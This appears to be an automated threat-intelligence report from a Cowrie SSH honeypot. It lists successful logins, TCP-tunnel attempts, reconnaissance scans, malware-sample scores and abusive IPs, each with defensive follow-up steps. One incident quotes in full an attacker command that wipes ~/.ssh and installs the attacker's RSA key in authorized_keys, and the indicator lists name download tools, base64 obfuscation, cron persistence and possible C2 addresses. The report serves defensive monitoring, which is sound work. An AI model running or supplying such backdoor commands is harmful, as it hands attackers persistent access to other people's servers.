| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:47:52` | `cowrie.session.connect` |
| `2026-09-09 18:47:52` | `cowrie.client.version` |
| `2026-09-09 18:47:52` | `cowrie.client.kex` |
| `2026-09-09 18:47:52` | `cowrie.login.success` |
| `2026-09-09 18:47:54` | `cowrie.session.params` |
| `2026-09-09 18:47:54` | `cowrie.command.input` |
| `2026-09-09 18:47:54` | `cowrie.session.file_download` |
| `2026-09-09 18:47:54` | `cowrie.session.file_download` |
| `2026-09-09 18:47:54` | `cowrie.log.closed` |
| `2026-09-09 18:47:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6af29e662b0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]115` |
| **First Seen** | 2026-09-09 18:49 |
| **Last Seen** | 2026-09-09 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:49:23` | `cowrie.session.connect` |
| `2026-09-09 18:49:24` | `cowrie.client.version` |
| `2026-09-09 18:49:24` | `cowrie.client.kex` |
| `2026-09-09 18:49:25` | `cowrie.login.success` |
| `2026-09-09 18:49:25` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:49:25` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:49:25` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]115` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92117b33f396

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-09 18:51 |
| **Last Seen** | 2026-09-09 18:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:51:20` | `cowrie.session.connect` |
| `2026-09-09 18:51:20` | `cowrie.client.version` |
| `2026-09-09 18:51:20` | `cowrie.client.kex` |
| `2026-09-09 18:51:20` | `cowrie.login.success` |
| `2026-09-09 18:51:22` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:51:22` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 18:51:22` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:51:23` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:51:23` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 18:51:23` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:51:23` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:51:23` | `cowrie.direct-tcpip.ja4` |
| `2026-09-09 18:51:23` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0fd98dee43

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-09 18:52 |
| **Last Seen** | 2026-09-09 18:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:52:19` | `cowrie.session.connect` |
| `2026-09-09 18:52:22` | `cowrie.client.version` |
| `2026-09-09 18:52:22` | `cowrie.client.kex` |
| `2026-09-09 18:52:24` | `cowrie.login.success` |
| `2026-09-09 18:52:24` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:52:25` | `cowrie.direct-tcpip.data` |
| `2026-09-09 18:52:26` | `cowrie.direct-tcpip.request` |
| `2026-09-09 18:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-399b73199571

| Field | Detail |
|---|---|
| **Source IP** | `107.211.37[.]253` |
| **First Seen** | 2026-09-09 18:54 |
| **Last Seen** | 2026-09-09 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:54:12` | `cowrie.session.connect` |
| `2026-09-09 18:54:12` | `cowrie.client.version` |
| `2026-09-09 18:54:12` | `cowrie.client.kex` |
| `2026-09-09 18:54:12` | `cowrie.login.success` |
| `2026-09-09 18:54:13` | `cowrie.session.params` |
| `2026-09-09 18:54:13` | `cowrie.command.input` |
| `2026-09-09 18:54:13` | `cowrie.command.failed` |
| `2026-09-09 18:54:13` | `cowrie.log.closed` |
| `2026-09-09 18:54:14` | `cowrie.session.params` |
| `2026-09-09 18:54:14` | `cowrie.command.input` |
| `2026-09-09 18:54:14` | `cowrie.session.file_download` |
| `2026-09-09 18:54:14` | `cowrie.log.closed` |
| `2026-09-09 18:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.211.37[.]253` to AbuseIPDB if not already reported
- [ ] Block `107.211.37[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04673b0077f5

| Field | Detail |
|---|---|
| **Source IP** | `107.211.37[.]253` |
| **First Seen** | 2026-09-09 18:54 |
| **Last Seen** | 2026-09-09 18:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:54:14` | `cowrie.session.connect` |
| `2026-09-09 18:54:14` | `cowrie.client.version` |
| `2026-09-09 18:54:14` | `cowrie.client.kex` |
| `2026-09-09 18:54:14` | `cowrie.login.success` |
| `2026-09-09 18:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.211.37[.]253` to AbuseIPDB if not already reported
- [ ] Block `107.211.37[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b560213443

| Field | Detail |
|---|---|
| **Source IP** | `107.211.37[.]253` |
| **First Seen** | 2026-09-09 18:54 |
| **Last Seen** | 2026-09-09 18:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-09 18:54:14` | `cowrie.session.connect` |
| `2026-09-09 18:54:14` | `cowrie.client.version` |
| `2026-09-09 18:54:14` | `cowrie.client.kex` |
| `2026-09-09 18:54:14` | `cowrie.login.success` |
| `2026-09-09 18:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.211.37[.]253` to AbuseIPDB if not already reported
- [ ] Block `107.211.37[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.42.41[.]164` | **20** | 2026-09-09 16:30 | 2026-09-09 17:15 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.189[.]202` | **7** | 2026-09-09 15:08 | 2026-09-09 15:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-09-09 14:53 | 2026-09-09 14:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]112` | **4** | 2026-09-09 18:13 | 2026-09-09 18:23 | 6m | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | **4** | 2026-09-09 12:58 | 2026-09-09 15:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `38.172.178[.]132` | **4** | 2026-09-09 14:36 | 2026-09-09 14:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]78` | **4** | 2026-09-09 13:55 | 2026-09-09 13:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.191.223[.]82` | **3** | 2026-09-09 15:59 | 2026-09-09 15:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `190.191.79[.]63` | **3** | 2026-09-09 13:43 | 2026-09-09 13:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **3** | 2026-09-09 16:33 | 2026-09-09 17:43 | 1m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]180` | **3** | 2026-09-09 13:55 | 2026-09-09 13:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]198` | **3** | 2026-09-09 17:05 | 2026-09-09 17:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]45` | **3** | 2026-09-09 13:56 | 2026-09-09 13:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]118` | **3** | 2026-09-09 13:56 | 2026-09-09 13:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]119` | **3** | 2026-09-09 13:56 | 2026-09-09 13:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]66` | **3** | 2026-09-09 15:04 | 2026-09-09 15:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.229.132[.]248` | **3** | 2026-09-09 15:02 | 2026-09-09 15:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.200[.]79` | **2** | 2026-09-09 17:35 | 2026-09-09 17:37 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-09-09 17:09 | 2026-09-09 17:27 | 1m | 0 | `T1592` | 🟢 LOW |
| `181.12.70[.]115` | **2** | 2026-09-09 17:38 | 2026-09-09 17:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-09-09 18:31 | 2026-09-09 18:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.112.110[.]110` | **2** | 2026-09-09 14:41 | 2026-09-09 14:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]128` | **2** | 2026-09-09 17:16 | 2026-09-09 17:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]189` | **2** | 2026-09-09 17:05 | 2026-09-09 17:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]38` | **2** | 2026-09-09 13:47 | 2026-09-09 13:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.207.245[.]212` | **2** | 2026-09-09 17:55 | 2026-09-09 17:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]177` | 1 | 2026-09-09 16:05 | 2026-09-09 16:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-09-09 13:28 | 2026-09-09 13:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-09-09 14:34 | 2026-09-09 14:34 | 40s | 0 | `T1592` | 🟢 LOW |
| `109.87.150[.]151` | 1 | 2026-09-09 15:03 | 2026-09-09 15:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.29.38[.]32` | 1 | 2026-09-09 16:03 | 2026-09-09 16:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.38.30[.]39` | 1 | 2026-09-09 16:42 | 2026-09-09 16:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.227.202[.]1` | 1 | 2026-09-09 18:02 | 2026-09-09 18:02 | 14s | 0 | `T1592` | 🟢 LOW |
| `123.139.242[.]2` | 1 | 2026-09-09 15:32 | 2026-09-09 15:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-09 15:22 | 2026-09-09 15:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-09 18:28 | 2026-09-09 18:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.198.29[.]172` | 1 | 2026-09-09 15:50 | 2026-09-09 15:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.153.7[.]81` | 1 | 2026-09-09 16:09 | 2026-09-09 16:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `148.204.109[.]139` | 1 | 2026-09-09 18:11 | 2026-09-09 18:11 | 10s | 0 | `T1592` | 🟢 LOW |
| `157.230.229[.]99` | 1 | 2026-09-09 16:51 | 2026-09-09 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-09-09 13:04 | 2026-09-09 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.43.76[.]120` | 1 | 2026-09-09 16:12 | 2026-09-09 16:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.2.80[.]8` | 1 | 2026-09-09 18:30 | 2026-09-09 18:30 | 29s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]93` | 1 | 2026-09-09 18:15 | 2026-09-09 18:15 | 2s | 0 | `T1592` | 🟢 LOW |
| `186.19.22[.]55` | 1 | 2026-09-09 15:31 | 2026-09-09 15:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-09 13:25 | 2026-09-09 13:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-09-09 16:51 | 2026-09-09 16:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.88[.]227` | 1 | 2026-09-09 17:43 | 2026-09-09 17:43 | 11s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-09-09 18:06 | 2026-09-09 18:07 | 4s | 0 | `T1592` | 🟢 LOW |
| `43.100.100[.]9` | 1 | 2026-09-09 18:08 | 2026-09-09 18:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-09-09 16:07 | 2026-09-09 16:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.227.36[.]5` | 1 | 2026-09-09 14:43 | 2026-09-09 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]202` | 1 | 2026-09-09 13:34 | 2026-09-09 13:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.99.119[.]101` | 1 | 2026-09-09 16:40 | 2026-09-09 16:41 | 11s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-09 17:25 | 2026-09-09 17:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]43` | 1 | 2026-09-09 14:06 | 2026-09-09 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]23` | 1 | 2026-09-09 18:29 | 2026-09-09 18:29 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.90.185[.]20` | LT | Limited Network LTD | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 8 |
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |
| `66.132.172[.]189` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `77.239.124[.]130` | FR | ROCKET & MARINICA LTD | **100** ⚠️ | 18 |
